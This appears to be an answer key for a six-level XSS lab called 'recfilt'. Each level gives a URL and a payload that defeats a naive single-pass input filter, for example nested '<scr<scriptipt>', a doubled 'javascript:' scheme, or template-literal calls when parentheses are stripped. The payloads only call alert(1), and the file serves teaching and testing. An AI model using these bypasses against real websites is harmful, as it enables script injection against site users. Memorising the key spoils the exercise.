# recfilt — solutions

Non-recursive (single-pass) filters that can be bypassed by nested duplication or alternative sinks.

### recfilt-level1

`/recfilt/level1/?query=%3Cscr%3Cscriptipt%3Ealert(1)%3C/script%3E`

- payload: `<scr<scriptipt>alert(1)</script>`
- context: `<script` stripped once non-recursively; nest to reassemble

### recfilt-level2

`/recfilt/level2/?query=%3Cimg%20src=x%20oonnerrorerror=alert(1)%3E`

- payload: `<img src=x oonnerrorerror=alert(1)>`
- context: `on\w+=` stripped once; nesting reassembles `onerror=`

### recfilt-level3

`/recfilt/level3/?query=%3C%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<<script>alert(1)</script>`
- context: only first `<` removed (sub, not gsub)

### recfilt-level4

`/recfilt/level4/?query=javascjavascript:ript:alert(1)`

- payload: `javascjavascript:ript:alert(1)`
- context: href; `javascript:` stripped once non-recursively, nest to reassemble

### recfilt-level5

`/recfilt/level5/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: JS string with escaped `"`; close the script tag instead

### recfilt-level6

`/recfilt/level6/?query=%3Cscript%3Ealert%601%60%3C/script%3E`

- payload: `<script>alert`1`</script>`
- context: parens stripped; use template literal call syntax
